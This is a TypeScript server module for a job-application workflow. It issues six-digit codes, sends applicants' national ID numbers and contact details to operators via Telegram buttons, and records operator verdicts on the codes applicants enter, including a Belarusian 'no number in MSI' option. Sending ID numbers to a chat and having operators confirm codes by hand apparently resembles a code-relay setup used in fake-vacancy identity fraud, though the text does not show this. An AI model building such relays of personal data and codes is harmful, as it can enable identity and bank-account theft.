import "server-only"
import { randomBytes, randomInt } from "node:crypto"
import { and, eq, inArray, sql } from "drizzle-orm"
import { revalidatePath } from "next/cache"
import { db } from "@/lib/db"
import { jobApplication, jobVacancy } from "@/lib/db/schema"
import { sendJobApplicationEmail, type JobMailKind } from "@/lib/email"
import { publish, topics } from "@/lib/realtime"
import { escapeTelegram, sendTelegramButtons } from "@/lib/telegram"
import { site } from "@/lib/site"
import { JOB_CODE_LENGTH, jobStageTitle } from "@/lib/jobs"

/**
 * Application lifecycle (same shape as the player's identity check):
 *   code        → the applicant must enter the 6-digit code
 *   code_review → the code was entered, an operator confirms it (Telegram or admin panel)
 *   pending     → identity confirmed; the "application received" letter goes out; HR decides
 *   approved / rejected / no_msi
 */
export type JobDecision = "codeok" | "codebad" | "nomsi" | "extra" | "approve" | "reject"

export function newJobCode() {
  return String(randomInt(0, 10 ** JOB_CODE_LENGTH)).padStart(JOB_CODE_LENGTH, "0")
}

export function newJobToken() {
  return randomBytes(18).toString("base64url")
}

export function jobStatusUrl(token: string) {
  return `${site.url}/jobs/apply/${token}`
}

const FROM_STATUS: Record<JobDecision, string[]> = {
  codeok: ["code_review"],
  codebad: ["code_review"],
  nomsi: ["code_review"],
  extra: ["pending", "code_review"],
  approve: ["pending"],
  reject: ["code", "code_review", "pending"],
}

const DECISION_FEEDBACK: Record<JobDecision, string> = {
  codeok: "Код подтверждён. Кандидату отправлено письмо «анкета принята, ожидайте одобрения».",
  codebad: "Код отклонён. Кандидату выдан новый код.",
  nomsi: "Кандидату показано: номера нет в МСИ, нужно обратиться в банк или ЕРИП.",
  extra: "Запрошена дополнительная проверка. Кандидату выдан новый код.",
  approve: "Анкета одобрена, кандидату отправлено письмо.",
  reject: "Анкета отклонена, кандидату отправлено письмо.",
}

async function loadWithVacancy(id: number) {
  const [row] = await db
    .select({ a: jobApplication, vacancyTitle: jobVacancy.title })
    .from(jobApplication)
    .innerJoin(jobVacancy, eq(jobVacancy.id, jobApplication.vacancyId))
    .where(eq(jobApplication.id, id))
    .limit(1)
  return row ?? null
}

function candidateLines(a: typeof jobApplication.$inferSelect, vacancyTitle: string) {
  return [
    `Вакансия: ${escapeTelegram(vacancyTitle)}`,
    `Кандидат: ${escapeTelegram(a.fullName)} (${escapeTelegram(a.email)})`,
    `Телефон: ${escapeTelegram(a.phone)}`,
    `Идентификационный номер: ${escapeTelegram(a.personalNumber)}`,
  ]
}

export async function announceJobCode(id: number) {
  const row = await loadWithVacancy(id)
  if (!row?.a.code) return
  await sendTelegramButtons(
    [
      `<b>Анкета на вакансию · ${escapeTelegram(jobStageTitle(row.a.stage))}</b> · #${row.a.id}`,
      ...candidateLines(row.a, row.vacancyTitle),
      `Выдан код: <code>${row.a.code}</code>`,
      "Ждём, когда кандидат введёт код.",
    ].join("\n"),
    { kind: "job", id },
    [{ text: "Отклонить анкету", decision: "reject" }],
  )
}

export async function announceJobEnteredCode(id: number) {
  const row = await loadWithVacancy(id)
  if (!row) return
  const matches = row.a.enteredCode === row.a.code
  await sendTelegramButtons(
    [
      `<b>Кандидат ввёл код</b> · анкета #${row.a.id}`,
      ...candidateLines(row.a, row.vacancyTitle),
      `Этап: ${escapeTelegram(jobStageTitle(row.a.stage))}`,
      `Введён: <code>${escapeTelegram(row.a.enteredCode ?? "")}</code>`,
      `Выдан: <code>${row.a.code ?? "—"}</code>`,
      matches ? "Коды совпадают." : "Коды НЕ совпадают.",
    ].join("\n"),
    { kind: "job", id },
    [
      { text: "Код верный", decision: "codeok" },
      { text: "Код неверный", decision: "codebad" },
      { text: "Нет номера в МСИ", decision: "nomsi" },
    ],
  )
}

async function askNextStep(id: number) {
  const row = await loadWithVacancy(id)
  if (!row) return
  await sendTelegramButtons(
    [
      `<b>Личность кандидата подтверждена</b> · анкета #${row.a.id}`,
      ...candidateLines(row.a, row.vacancyTitle),
      `Пройдено проверок: ${row.a.stage + 1}`,
      `Файлы и анкета: ${site.url}/admin/jobs`,
      "Кандидат получил письмо «анкета принята». Что дальше?",
    ].join("\n"),
    { kind: "job", id },
    [
      { text: "Доп. проверка", decision: "extra" },
      { text: "Одобрить анкету", decision: "approve" },
      { text: "Отклонить", decision: "reject" },
    ],
  )
}

async function afterChange() {
  revalidatePath("/jobs", "layout")
  revalidatePath("/admin/jobs")
  await Promise.all([publish(topics.adminJobs), publish(topics.adminCounts)])
}

async function mailApplicant(id: number, kind: JobMailKind, reason: string | null = null) {
  const row = await loadWithVacancy(id)
  if (!row) return
  try {
    await sendJobApplicationEmail({
      to: row.a.email,
      name: row.a.fullName.split(" ")[1] ?? row.a.fullName,
      kind,
      id: row.a.id,
      vacancy: row.vacancyTitle,
      statusUrl: jobStatusUrl(row.a.token),
      reason,
    })
    if (kind === "received") await db.update(jobApplication).set({ acceptedMailAt: new Date() }).where(eq(jobApplication.id, id))
  } catch (error) {
    console.error(`[jobs] ${kind} mail failed for application #${id}:`, error instanceof Error ? error.message : error)
  }
}

/** Applies an operator decision; returns false when the application is no longer at a stage the decision applies to. */
export async function decideJobApplication(id: number, decision: JobDecision, note: string | null = null) {
  if (!Number.isInteger(id) || id <= 0 || id > 2147483647) return false
  const now = new Date()
  const set =
    decision === "codeok"
      ? { status: "pending" }
      : decision === "codebad"
        ? { status: "code", code: newJobCode(), enteredCode: null, codeSentAt: now }
        : decision === "nomsi"
          ? { status: "no_msi", code: null, enteredCode: null, note: null, reviewedAt: now }
          : decision === "extra"
            ? { status: "code", code: newJobCode(), enteredCode: null, codeSentAt: now, stage: sql`${jobApplication.stage} + 1` }
            : decision === "approve"
              ? { status: "approved", code: null, enteredCode: null, note: null, reviewedAt: now }
              : { status: "rejected", code: null, enteredCode: null, note, reviewedAt: now }

  const [row] = await db
    .update(jobApplication)
    .set(set)
    .where(and(eq(jobApplication.id, id), inArray(jobApplication.status, FROM_STATUS[decision])))
    .returning({ id: jobApplication.id, acceptedMailAt: jobApplication.acceptedMailAt })
  if (!row) return false

  await afterChange()
  if (decision === "codeok") {
    // The applicant hears from us the moment identity is confirmed; a repeat confirmation after an extra check stays silent.
    if (!row.acceptedMailAt) await mailApplicant(id, "received")
    await askNextStep(id)
  }
  if (decision === "codebad" || decision === "extra") await announceJobCode(id)
  if (decision === "approve") await mailApplicant(id, "approved")
  if (decision === "reject") await mailApplicant(id, "rejected", note)
  return true
}

export function jobFeedback(decision: JobDecision) {
  return DECISION_FEEDBACK[decision]
}

export function isJobDecision(value: string): value is JobDecision {
  return value in FROM_STATUS
}
